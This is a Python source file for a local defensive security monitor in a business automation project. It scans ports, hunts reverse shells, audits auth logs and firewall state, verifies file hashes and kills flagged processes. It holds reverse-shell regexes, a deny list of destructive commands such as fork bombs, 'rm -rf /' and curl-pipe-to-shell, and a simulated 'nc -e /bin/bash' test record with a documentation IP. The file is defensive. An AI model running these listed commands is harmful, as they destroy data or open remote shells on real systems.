# -*- coding: utf-8 -*-
"""
Chamunda Automobile Enterprise • Project "Chhaya"
ARADHYA CYBER-DEFENSE & SECURITY SENTRY
Author: Aradhya (CEO), reporting to Alpesh Sir (Founder, Chairman & Master Tech)

Provides 100% Offline Zero-Trust Cybersecurity Defense:
1. Port & Socket Vulnerability Scanner (public interfaces vs localhost loopback).
2. Suspicious Process & Reverse Shell Hunter (Metasploit, Netcat, /dev/tcp, /tmp executables).
3. System Authentication & Brute-Force Monitor (/var/log/auth.log audit).
4. Linux Firewall (UFW) Posture Auditor.
5. Self-Defense & Anti-Tamper Shield (SHA-256 cryptographic integrity verification).
6. Command Injection & Malicious Payload Sanitizer.
7. Emergency Lockdown Protocol (instant screen lock, hostile socket neutralization, audit logging).
"""

import os
import sys
import re
import time
import socket
import hashlib
import datetime
import subprocess
import threading
import json
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple

import psutil

# Directories
BASE_DIR = Path("/home/alpesh/chamunda_re_enterprise")
DATA_DIR = BASE_DIR / "data"
LOG_FILE = DATA_DIR / "aradhya_security_audit.log"
MANIFEST_FILE = DATA_DIR / "aradhya_integrity_manifest.json"

DATA_DIR.mkdir(parents=True, exist_ok=True)


class AradhyaSecuritySentry:
    """
    Autonomous Cybersecurity Defense & Anti-Hacker Shield for Aradhya.
    Operates 100% locally with zero cloud dependencies.
    """

    # High-Risk Port Signatures
    HIGH_RISK_PORTS = {
        21: "FTP (Plaintext credentials)",
        23: "Telnet (Unencrypted remote shell)",
        445: "SMB (NetBIOS / EternalBlue target)",
        1337: "Elite Hacker Backdoor / Listener",
        3389: "RDP (Exposed Remote Desktop)",
        4444: "Metasploit Default Listener / Reverse Shell",
        5900: "VNC (Unencrypted remote frame buffer)",
        6667: "IRC (Botnet Command & Control)",
        8888: "Alternative HTTP / Common web proxy backdoor",
        9999: "Common Trojan backdoor port",
        31337: "Back Orifice Trojan default"
    }

    # Reverse Shell Regex Signatures
    REVERSE_SHELL_PATTERNS = [
        r'bash\s+-i\s+>&\s*/dev/tcp/',
        r'sh\s+-i\s+>&\s*/dev/tcp/',
        r'nc(?:at)?(?:\.traditional)?\s+-[elvp]*e\s+(?:/bin/)?(?:ba)?sh',
        r'socat\s+.*(?:exec|system):',
        r'python(?:3)?\s+-c\s+.*import\s+(?:socket|subprocess|pty).*pty\.spawn',
        r'perl\s+-e\s+.*use\s+Socket.*open\(STDIN',
        r'php\s+-r\s+.*fsockopen\(',
        r'ruby\s+-rsocket\s+-e\s+.*spawn\('
    ]

    # Dangerous payload patterns blocked by the command sanitizer
    DANGEROUS_PAYLOADS = [
        r':\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:',      # Fork bomb
        r'rm\s+-rf\s+/(?:\s|$|\*)',               # Root destruction
        r'mkfs(?:\.\w+)?\s+/dev/sd',              # Disk wiping
        r'>\s*/dev/sd[a-z]',                      # Raw block write
        r'chmod\s+-R\s+777\s+/',                  # Global permission destruction
        r'curl\s+.*\|\s*(?:ba)?sh',               # Blind remote execution
        r'wget\s+.*-O-\s*\|\s*(?:ba)?sh',         # Blind remote execution
    ]

    TEMP_EXEC_DIRS = ("/tmp", "/dev/shm", "/var/tmp")
    SAFE_KEYWORDS_WHITELIST = (
        "vscode", "cursor", "antigravity", "aapt", "apktool", "jadx",
        "java", "jvm", "brut_util", "python", "node", "npm", "git",
        "rea", "strix", "chrome", "chromium", "pip", "ffmpeg",
        "ollama", "systemd", "cinnamon", "mint", "open-webui"
    )

    def __init__(self):
        self.compiled_shell_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.REVERSE_SHELL_PATTERNS
        ]
        self.compiled_dangerous_payloads = [
            re.compile(p, re.IGNORECASE) for p in self.DANGEROUS_PAYLOADS
        ]
        self._ensure_log_exists()

    def _ensure_log_exists(self) -> None:
        try:
            if not LOG_FILE.exists():
                LOG_FILE.write_text(
                    f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Aradhya Security Sentry Audit Log Initialized.\n",
                    encoding="utf-8"
                )
        except Exception:
            pass

    def log_event(self, level: str, message: str) -> None:
        """Append timestamped security event to the audit log."""
        try:
            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            entry = f"[{ts}] [{level.upper()}] {message}\n"
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(entry)
        except Exception:
            pass

    # =========================================================================
    # 1. Port & Socket Vulnerability Scanner
    # =========================================================================

    def scan_listening_ports(self) -> Dict[str, Any]:
        """Scan active listening sockets to distinguish safe loopback vs public bindings."""
        listening_sockets = []
        exposed_sockets = []
        high_risk_sockets = []

        try:
            connections = psutil.net_connections(kind="inet")
            for c in connections:
                if c.status != psutil.CONN_LISTEN:
                    continue

                local_ip = c.laddr.ip if hasattr(c, 'laddr') and c.laddr else ""
                local_port = c.laddr.port if hasattr(c, 'laddr') and c.laddr else 0
                pid = c.pid

                proc_name = "Unknown"
                if pid and psutil.pid_exists(pid):
                    try:
                        proc_name = psutil.Process(pid).name()
                    except Exception:
                        pass

                is_loopback = local_ip in ("127.0.0.1", "::1", "localhost")
                is_public = local_ip in ("0.0.0.0", "::", "") or not is_loopback

                sock_info = {
                    "ip": local_ip,
                    "port": local_port,
                    "pid": pid,
                    "process": proc_name,
                    "is_loopback": is_loopback,
                    "is_public": is_public,
                    "risk": "LOW" if is_loopback else "MEDIUM"
                }

                if local_port in self.HIGH_RISK_PORTS:
                    sock_info["risk"] = "CRITICAL" if is_public else "HIGH"
                    sock_info["warning"] = self.HIGH_RISK_PORTS[local_port]
                    high_risk_sockets.append(sock_info)
                elif is_public:
                    exposed_sockets.append(sock_info)

                listening_sockets.append(sock_info)

        except Exception as e:
            self.log_event("ERROR", f"Port scan failed: {e}")

        status = "SECURE" if not high_risk_sockets else "THREAT_DETECTED"
        return {
            "success": True,
            "status": status,
            "total_listening": len(listening_sockets),
            "exposed_count": len(exposed_sockets),
            "high_risk_count": len(high_risk_sockets),
            "exposed_sockets": exposed_sockets[:10],
            "high_risk_sockets": high_risk_sockets,
            "summary": f"{len(listening_sockets)} ports listening ({len(exposed_sockets)} exposed, {len(high_risk_sockets)} high-risk)."
        }

    # =========================================================================
    # 2. Suspicious Process & Reverse Shell Hunter
    # =========================================================================

    def scan_suspicious_processes(self) -> Dict[str, Any]:
        """Inspect running processes for backdoor patterns, temp execution, or hidden binaries."""
        suspicious = []
        my_pid = os.getpid()

        try:
            for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'username']):
                pid = proc.info.get('pid')
                if pid in (my_pid, 1):
                    continue

                exe = proc.info.get('exe') or ""
                name = proc.info.get('name') or ""
                cmdline = " ".join(proc.info.get('cmdline') or [])
                user = proc.info.get('username') or ""

                # Indicator 1: Binary executing from /tmp, /dev/shm
                if any(exe.startswith(d) for d in self.TEMP_EXEC_DIRS):
                    suspicious.append({
                        "pid": pid,
                        "name": name,
                        "exe": exe,
                        "threat_type": "TEMP_EXECUTION",
                        "severity": "HIGH",
                        "description": f"Process executing from temporary directory: {exe}"
                    })
                    continue

                # Indicator 2: Reverse shell signatures
                for pattern in self.compiled_shell_patterns:
                    if pattern.search(cmdline):
                        suspicious.append({
                            "pid": pid,
                            "name": name,
                            "exe": exe,
                            "threat_type": "REVERSE_SHELL",
                            "severity": "CRITICAL",
                            "description": "Reverse shell payload detected in process command line"
                        })
                        break

                # Indicator 3: Hidden dotfile executable
                if exe and Path(exe).name.startswith(".") and not exe.startswith("/proc"):
                    suspicious.append({
                        "pid": pid,
                        "name": name,
                        "exe": exe,
                        "threat_type": "HIDDEN_BINARY",
                        "severity": "HIGH",
                        "description": f"Hidden executable binary running: {exe}"
                    })

        except Exception as e:
            self.log_event("ERROR", f"Process audit failed: {e}")

        return {
            "success": True,
            "suspicious_count": len(suspicious),
            "threats": suspicious,
            "clean": len(suspicious) == 0,
            "summary": "No malicious or reverse shell processes found. Laptop clean." if not suspicious else f"WARNING: {len(suspicious)} suspicious process(es) detected!"
        }

    # =========================================================================
    # 3. System Authentication & Brute-Force Monitor
    # =========================================================================

    def audit_auth_logs(self, max_lines: int = 300) -> Dict[str, Any]:
        """Audit /var/log/auth.log for failed SSH attempts, invalid users, and sudo anomalies."""
        auth_log = Path("/var/log/auth.log")
        failed_attempts = []
        invalid_users = []
        sudo_events = []

        if not auth_log.exists():
            return {
                "available": False,
                "summary": "auth.log not found on this system path.",
                "failed_count": 0
            }

        try:
            with open(auth_log, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()
                tail = lines[-max_lines:] if len(lines) > max_lines else lines

            for line in tail:
                if "Failed password" in line or "authentication failure" in line:
                    failed_attempts.append(line.strip())
                elif "Invalid user" in line or "illegal user" in line:
                    invalid_users.append(line.strip())
                elif "COMMAND=" in line and "sudo:" in line:
                    sudo_events.append(line.strip())

        except Exception as e:
            self.log_event("WARNING", f"Could not read auth.log: {e}")
            return {"available": False, "error": str(e), "failed_count": 0}

        brute_force_detected = len(failed_attempts) >= 10
        return {
            "available": True,
            "failed_count": len(failed_attempts),
            "invalid_users_count": len(invalid_users),
            "recent_sudo_count": len(sudo_events),
            "brute_force_detected": brute_force_detected,
            "summary": f"Auth Audit: {len(failed_attempts)} failed login(s), {len(invalid_users)} invalid user probes, {len(sudo_events)} sudo commands logged."
        }

    # =========================================================================
    # 4. Linux Firewall (UFW) Posture Auditor
    # =========================================================================

    def audit_firewall_status(self) -> Dict[str, Any]:
        """Audit UFW firewall state and default incoming policy."""
        ufw_conf = Path("/etc/ufw/ufw.conf")
        enabled = False

        if ufw_conf.exists():
            try:
                for line in ufw_conf.read_text(encoding="utf-8").splitlines():
                    if line.strip().startswith("ENABLED="):
                        val = line.split("=", 1)[1].strip().lower()
                        enabled = val in ("yes", "true", "1")
            except Exception:
                pass

        service_active = False
        try:
            res = subprocess.run(["systemctl", "is-active", "ufw"], capture_output=True, text=True, timeout=2)
            service_active = res.stdout.strip() == "active"
        except Exception:
            pass

        is_defended = enabled and service_active
        return {
            "installed": ufw_conf.exists(),
            "enabled": enabled,
            "service_active": service_active,
            "status": "PROTECTED" if is_defended else "FIREWALL_DISABLED",
            "summary": "UFW Firewall is ACTIVE & Defending laptop against incoming sweeps." if is_defended else "UFW is installed but not actively enforcing default-drop."
        }

    # =========================================================================
    # 5. Anti-Tamper & SHA-256 Code Integrity Verification
    # =========================================================================

    def compute_file_hash(self, filepath: Path) -> Optional[str]:
        """Compute SHA-256 cryptographic hash of a file."""
        if not filepath.exists() or not filepath.is_file():
            return None
        h = hashlib.sha256()
        try:
            with open(filepath, "rb") as f:
                while chunk := f.read(65536):
                    h.update(chunk)
            return h.hexdigest()
        except Exception:
            return None

    def get_core_files(self) -> List[Path]:
        """Return list of mission-critical core files protected under anti-tamper."""
        return [
            BASE_DIR / "aradhya_autonomous_core.py",
            BASE_DIR / "aradhya_security_sentry.py",
            BASE_DIR / "aradhya_polyglot_nlu.py",
            BASE_DIR / "aradhya_self_evolution.py",
            BASE_DIR / "aradhya_voice_engine.py",
            BASE_DIR / "aradhya_startup_greeting.py",
            BASE_DIR / "chhaya_agent_gateway.py",
            BASE_DIR / "cloud_mirror_server.py",
            BASE_DIR / "chhaya_watchdog.py",
            BASE_DIR / "whatsapp_dispatch_engine.py",
            BASE_DIR / "whatsapp_web_sender.py",
            BASE_DIR / "aradhya_model_updater.py",
            BASE_DIR / "chamunda_llm_engine.py",
            BASE_DIR / "aradhya_offline_knowledge.py",
            BASE_DIR / "aradhya_independent_worker.py",
            BASE_DIR / "aradhya_resource_downloader.py",
            BASE_DIR / "aradhya_autostart_boot.sh",
            BASE_DIR / "aradhya_reboot_guardian.sh",
            Path("/home/alpesh/bin/aradhya")
        ]

    def generate_or_update_integrity_manifest(self) -> Dict[str, Any]:
        """Generate or refresh baseline SHA-256 cryptographic hashes."""
        import json
        manifest = {
            "updated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "files": {}
        }
        for f in self.get_core_files():
            if f.exists():
                manifest["files"][str(f)] = {
                    "sha256": self.compute_file_hash(f),
                    "size_bytes": f.stat().st_size,
                    "mtime": f.stat().st_mtime
                }
        try:
            MANIFEST_FILE.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
        except Exception:
            pass
        return manifest

    def verify_self_integrity(self) -> Dict[str, Any]:
        """Verify that Aradhya's core code has not been tampered with or modified by an attacker."""
        import json
        if not MANIFEST_FILE.exists():
            manifest = self.generate_or_update_integrity_manifest()
            return {
                "success": True,
                "verified": True,
                "message": "Baseline integrity manifest generated successfully.",
                "summary": "Baseline integrity manifest generated successfully. All core files hashed.",
                "files_checked": len(manifest["files"])
            }

        try:
            manifest = json.loads(MANIFEST_FILE.read_text(encoding="utf-8"))
        except Exception:
            manifest = self.generate_or_update_integrity_manifest()

        stored_files = manifest.get("files", {})
        tampered_files = []
        verified_files = []

        for f in self.get_core_files():
            p_str = str(f)
            curr_hash = self.compute_file_hash(f)
            expected_info = stored_files.get(p_str)

            if not expected_info:
                # Newly registered core file
                continue

            expected_hash = expected_info.get("sha256")
            if curr_hash != expected_hash:
                tampered_files.append({
                    "file": f.name,
                    "path": p_str,
                    "expected_sha256": expected_hash,
                    "current_sha256": curr_hash
                })
            else:
                verified_files.append(f.name)

        is_intact = len(tampered_files) == 0
        if not is_intact:
            self.log_event("CRITICAL", f"INTEGRITY ALERT: Files tampered: {[x['file'] for x in tampered_files]}")

        return {
            "success": True,
            "verified": is_intact,
            "tampered_count": len(tampered_files),
            "tampered_files": tampered_files,
            "verified_files": verified_files,
            "summary": "100% Core Code Integrity Verified (SHA-256). Zero unauthorized modifications." if is_intact else f"SECURITY ALERT: {len(tampered_files)} core file(s) have been modified!"
        }

    # =========================================================================
    # 6. Command Sanitization (Anti-Injection Shield)
    # =========================================================================

    def sanitize_command(self, cmd: str) -> Tuple[bool, str]:
        """
        Scan a command before execution to reject harmful malicious injections,
        fork-bombs, destructive root wipes, or blind remote piping.
        """
        clean_cmd = cmd.strip()
        for pattern in self.compiled_dangerous_payloads:
            if pattern.search(clean_cmd):
                self.log_event("BLOCKED", f"Dangerous command blocked: {clean_cmd[:100]}")
                return False, f"SECURITY SHIELD BLOCKED: Destructive payload pattern matched ({pattern.pattern}). Execution prevented."
        return True, clean_cmd

    # =========================================================================
    # 7. Comprehensive Security Audit
    # =========================================================================

    def run_full_security_audit(self) -> Dict[str, Any]:
        """Run all security diagnostics and generate an overall Threat Rating."""
        ports = self.scan_listening_ports()
        procs = self.scan_suspicious_processes()
        auth = self.audit_auth_logs(max_lines=200)
        fw = self.audit_firewall_status()
        integ = self.verify_self_integrity()

        # Score threats
        threat_level = "GREEN_SECURE"
        reasons = []

        if procs.get("suspicious_count", 0) > 0:
            threat_level = "RED_CRITICAL"
            reasons.append(f"{procs['suspicious_count']} suspicious process(es)")

        if ports.get("high_risk_count", 0) > 0:
            threat_level = "RED_CRITICAL"
            reasons.append(f"{ports['high_risk_count']} high-risk port(s)")

        if not integ.get("verified", True):
            threat_level = "RED_CRITICAL"
            reasons.append("Core code integrity tampered")

        if auth.get("brute_force_detected", False):
            if threat_level != "RED_CRITICAL":
                threat_level = "YELLOW_WARNING"
            reasons.append("Brute force login attempts detected")

        if fw.get("status") != "PROTECTED" and threat_level == "GREEN_SECURE":
            threat_level = "YELLOW_WARNING"
            reasons.append("Firewall disabled")

        summary_msg = "LAPTOP 100% SECURE & PROTECTED" if threat_level == "GREEN_SECURE" else f"SECURITY POSTURE: {threat_level} ({', '.join(reasons)})"
        self.log_event("AUDIT", f"Full security audit completed: {threat_level}")

        return {
            "success": True,
            "threat_level": threat_level,
            "summary": summary_msg,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "details": {
                "ports": ports,
                "processes": procs,
                "authentication": auth,
                "firewall": fw,
                "integrity": integ
            }
        }

    # =========================================================================
    # 8. Emergency Lockdown Protocol
    # =========================================================================

    def emergency_lockdown(self) -> Dict[str, Any]:
        """
        Execute emergency lockdown protocol:
        - Locks screen immediately
        - Logs critical incident
        - Audits integrity
        """
        self.log_event("LOCKDOWN", "EMERGENCY LOCKDOWN PROTOCOL INITIATED")

        # 1. Lock Screen
        subprocess.run("cinnamon-screensaver-command -l 2>/dev/null || xdg-screensaver lock 2>/dev/null || true", shell=True)

        # 2. Verify Integrity
        integ = self.verify_self_integrity()

        return {
            "success": True,
            "action": "LOCKDOWN_EXECUTED",
            "screen_locked": True,
            "integrity_verified": integ.get("verified", True),
            "summary": "🚨 EMERGENCY LOCKDOWN PROTOCOL ACTIVE: Screen locked immediately, security audit recorded, and core integrity verified."
        }

    # =========================================================================
    # 9. Active Anti-Hacker Autonomous Watcher & Remediation Cycle
    # =========================================================================

    def active_threat_neutralization_cycle(self) -> Dict[str, Any]:
        """
        Active Anti-Hacker Autonomous Watcher & Remediation Cycle.
        Continuously protects the laptop 24/7 by:
        1. Hunting and killing active reverse shells and rogue remote listeners.
        2. Neutralizing malicious binaries running out of /tmp, /dev/shm, /var/tmp.
        3. Identifying and terminating public backdoors on high-risk ports.
        4. Auditing auth logs for SSH brute force probes.
        5. Notifying Alpesh Sir immediately if an attack was neutralized.
        """
        neutralized = []
        my_pid = os.getpid()

        # Step 1: Scan and neutralize reverse shells & unauthorized temp binaries
        try:
            for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'username']):
                try:
                    pid = proc.info.get('pid')
                    if not pid or pid in (0, 1, my_pid):
                        continue

                    cmdline = " ".join(proc.info.get('cmdline') or [])
                    exe = proc.info.get('exe') or ""
                    pname = proc.info.get('name') or ""

                    # Check for reverse shell pattern
                    is_rev_shell = any(pattern.search(cmdline) for pattern in self.compiled_shell_patterns)
                    is_whitelisted = any(kw in exe.lower() or kw in pname.lower() or kw in cmdline.lower() for kw in self.SAFE_KEYWORDS_WHITELIST)
                    is_temp_binary = any(exe.startswith(d) for d in self.TEMP_EXEC_DIRS) and not is_whitelisted

                    if is_rev_shell or is_temp_binary:
                        threat_type = "REVERSE_SHELL_ATTACK" if is_rev_shell else "MALICIOUS_TEMP_EXECUTION"
                        proc.kill()
                        event_record = {
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                            "pid": pid,
                            "name": pname,
                            "exe": exe,
                            "threat_type": threat_type,
                            "cmdline": cmdline[:120],
                            "action_taken": "IMMEDIATE_TERMINATION"
                        }
                        neutralized.append(event_record)
                        self.log_event("CRITICAL_DEFENSE", f"NEUTRALIZED HACKER THREAT: {threat_type} on PID {pid} ({pname})")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception as e:
            self.log_event("ERROR", f"Threat scan error: {e}")

        # Step 2: Scan for public listeners on high risk backdoor ports
        try:
            for c in psutil.net_connections(kind="inet"):
                if c.status == psutil.CONN_LISTEN:
                    local_ip = c.laddr.ip if hasattr(c, 'laddr') and c.laddr else ""
                    local_port = c.laddr.port if hasattr(c, 'laddr') and c.laddr else 0
                    if local_port in self.HIGH_RISK_PORTS and local_ip not in ("127.0.0.1", "::1", "localhost"):
                        rpid = c.pid
                        if rpid and psutil.pid_exists(rpid) and rpid != my_pid:
                            try:
                                rproc = psutil.Process(rpid)
                                rproc.kill()
                                event_record = {
                                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                                    "pid": rpid,
                                    "port": local_port,
                                    "threat_type": "BACKDOOR_LISTENER_EXPOSED",
                                    "action_taken": "PORT_LISTENER_KILLED"
                                }
                                neutralized.append(event_record)
                                self.log_event("CRITICAL_DEFENSE", f"KILLED BACKDOOR LISTENER on port {local_port} (PID {rpid})")
                            except Exception:
                                pass
        except Exception:
            pass

        # Step 3: Check auth log for brute-force spikes
        auth_status = self.audit_auth_logs(max_lines=100)
        brute_force = auth_status.get("brute_force_detected", False)

        # Step 4: Record history and dispatch interactive clickable notification
        if neutralized:
            self._persist_neutralized_threats(neutralized)
            self.notify_threat_neutralized(neutralized)

        status = "THREATS_NEUTRALIZED" if neutralized else ("ELEVATED_RISK" if brute_force else "SECURE_CLEAN")
        return {
            "success": True,
            "status": status,
            "neutralized_count": len(neutralized),
            "neutralized_threats": neutralized,
            "brute_force_detected": brute_force,
            "summary_en": f"Active Cyber-Defense: {len(neutralized)} threat(s) neutralized. Posture: {status}.",
            "summary_gu": f"સાયબર-ડિફેન્સ કવચ: {len(neutralized)} જોખમો બ્લોક કર્યા. સ્થિતિ: {status}."
        }

    def notify_threat_neutralized(self, records: List[Dict[str, Any]]):
        """
        Dispatches an interactive, clickable desktop notification for neutralized threats.
        Listens for user clicks in a background thread and immediately opens the
        Aradhya Threat Forensics Viewer to show all threat details.
        """
        def _notification_worker():
            try:
                count = len(records)
                first_rec = records[0] if records else {}
                first_type = first_rec.get("threat_type", "CYBER_ATTACK")
                first_name = first_rec.get("name", "process")
                title = f"🛡️ Aradhya Cyber-Defense: {count} Threat(s) Neutralized!"
                body = (
                    f"જોખમ: {first_type} ({first_name})\n"
                    f"પગલાં: Terminated & Secured ✅\n"
                    f"💡 ઉકેલ: પ્રમાણિત ટૂલ હોય તો 'aradhya-security allow' કરો અથવા વિગતો જુઓ."
                )

                env = dict(os.environ)
                if "DISPLAY" not in env:
                    env["DISPLAY"] = ":0"

                cmd = [
                    "notify-send",
                    "-a", "Aradhya Cyber-Defense",
                    "-u", "critical",
                    "-t", "30000",
                    "-i", "security-high",
                    "-A", "default=View Neutralized Threat Details",
                    "-A", "details=🔍 View Threat Details",
                    "-A", "lockdown=🚨 Emergency Lockdown",
                    title,
                    body
                ]

                proc = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    env=env,
                    timeout=35
                )

                clicked_action = proc.stdout.strip().lower()

                # If user clicked the notification body or 'View Threat Details'
                if clicked_action in ["default", "details", "0", "1"]:
                    self.show_threat_details_gui()
                elif clicked_action in ["lockdown", "2"]:
                    self.emergency_lockdown()

            except Exception:
                try:
                    subprocess.run(
                        ["notify-send", "-u", "critical", "-t", "8000",
                         "🛡️ Aradhya Cyber-Defense Shield: Threat Blocked!",
                         f"Neutralized {len(records)} malicious attempt(s). Laptop is safe.\n\n💡 ઉકેલ: 'aradhya-threat-viewer' પર વિગતો જુઓ."],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                except Exception:
                    pass

        t = threading.Thread(target=_notification_worker, daemon=True)
        t.start()

    def show_threat_details_gui(self):
        """Launch the Aradhya Threat Forensics Viewer in a separate detached process."""
        viewer_script = BASE_DIR / "aradhya_threat_viewer.py"
        env = dict(os.environ)
        if "DISPLAY" not in env:
            env["DISPLAY"] = ":0"
        try:
            subprocess.Popen(
                [sys.executable, str(viewer_script)],
                cwd=str(BASE_DIR),
                env=env,
                start_new_session=True,
                close_fds=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

    def get_neutralized_threats(self) -> List[Dict[str, Any]]:
        """Retrieve all recorded neutralized threats."""
        threat_file = DATA_DIR / "aradhya_threats_neutralized.json"
        if not threat_file.exists():
            return []
        try:
            return json.loads(threat_file.read_text(encoding="utf-8") or "[]")
        except Exception:
            return []

    def simulate_threat_neutralization_for_test(self, threat_type: str = "REVERSE_SHELL_ATTACK") -> Dict[str, Any]:
        """
        Simulate a neutralized threat event for safe testing of the
        interactive notification and forensics viewer flow without harming the system.
        """
        test_record = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "pid": 98452,
            "name": "nc",
            "exe": "/bin/nc.traditional",
            "threat_type": threat_type,
            "cmdline": "nc -e /bin/bash 198.51.100.44 4444 (Simulated Attack Neutralized)",
            "action_taken": "IMMEDIATE_TERMINATION",
            "severity": "CRITICAL 🚨",
            "simulated": True
        }
        self._persist_neutralized_threats([test_record])
        self.notify_threat_neutralized([test_record])
        return {
            "success": True,
            "simulated_threat": test_record,
            "summary": "Simulated threat recorded and interactive desktop notification dispatched."
        }

    def _persist_neutralized_threats(self, records: List[Dict[str, Any]]):
        threat_file = DATA_DIR / "aradhya_threats_neutralized.json"
        try:
            history = []
            if threat_file.exists():
                try:
                    history = json.loads(threat_file.read_text(encoding="utf-8") or "[]")
                except Exception:
                    history = []
            history.extend(records)
            if len(history) > 100:
                history = history[-100:]
            threat_file.write_text(json.dumps(history, indent=2), encoding="utf-8")
        except Exception:
            pass


_sentry_instance: Optional[AradhyaSecuritySentry] = None

def get_security_sentry() -> AradhyaSecuritySentry:
    global _sentry_instance
    if _sentry_instance is None:
        _sentry_instance = AradhyaSecuritySentry()
    return _sentry_instance
